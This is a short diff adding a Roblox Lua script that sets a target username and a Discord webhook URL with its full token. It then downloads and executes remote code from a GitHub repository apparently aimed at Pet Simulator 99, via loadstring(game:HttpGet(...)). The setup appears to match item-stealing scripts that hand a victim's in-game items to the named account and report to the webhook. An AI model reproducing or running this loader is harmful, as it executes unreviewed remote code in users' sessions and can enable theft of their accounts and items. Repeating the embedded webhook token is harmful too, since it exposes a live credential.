@@ -1,0 +1,4 @@
+Roblox_Username = "bilal200129"
+Discord_Webhook =  "https://discord.com/api/webhooks/1287857221954306140/_kg3KdZz9MV46qWNOxzh8l0dJFZR772psqfsVZgbQfpyIh0XaYR-W7wk59BBantxqhK1"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Skidtho/Ps99/main/Ps99.lua"))()
